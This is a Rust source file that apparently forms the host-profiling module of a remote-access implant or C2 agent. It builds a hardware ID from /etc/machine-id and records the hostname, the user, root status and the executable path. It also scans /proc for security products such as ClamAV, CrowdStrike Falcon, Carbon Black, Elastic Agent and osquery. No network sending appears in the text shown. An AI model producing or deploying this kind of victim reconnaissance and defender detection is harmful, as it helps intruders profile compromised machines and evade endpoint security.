use super::SystemInfo;
use sha2::{Sha256, Digest};

pub fn gather_system_info() -> SystemInfo {
    let machine_id = std::fs::read_to_string("/etc/machine-id")
        .unwrap_or_else(|_| "unknown".to_string())
        .trim()
        .to_string();
    let hwid = hex::encode(Sha256::digest(machine_id.as_bytes()));

    let hostname = std::fs::read_to_string("/etc/hostname")
        .unwrap_or_else(|_| "unknown".to_string())
        .trim()
        .to_string();

    let username = std::env::var("USER")
        .unwrap_or_else(|_| "unknown".to_string());

    let privileges = if nix::unistd::geteuid().is_root() {
        "admin".to_string()
    } else {
        "user".to_string()
    };

    let av = detect_av();

    let exe_path = std::env::current_exe()
        .map(|p| p.display().to_string())
        .unwrap_or_else(|_| "unknown".to_string());

    SystemInfo {
        hwid,
        hostname,
        os: std::env::consts::OS.to_string(),
        arch: std::env::consts::ARCH.to_string(),
        username,
        privileges,
        av,
        exe_path,
    }
}

fn detect_av() -> Vec<String> {
    let av_processes = [
        ("clamd", "ClamAV"),
        ("freshclam", "ClamAV"),
        ("elastic-agent", "Elastic Agent"),
        ("osqueryd", "osquery"),
        ("falcon-sensor", "CrowdStrike"),
        ("cbagentd", "Carbon Black"),
    ];
    let mut found = Vec::new();
    if let Ok(entries) = std::fs::read_dir("/proc") {
        for entry in entries.flatten() {
            let cmdline_path = entry.path().join("cmdline");
            if let Ok(cmdline) = std::fs::read_to_string(&cmdline_path) {
                for (proc_name, av_name) in &av_processes {
                    if cmdline.contains(proc_name) && !found.contains(&av_name.to_string()) {
                        found.push(av_name.to_string());
                    }
                }
            }
        }
    }
    found
}
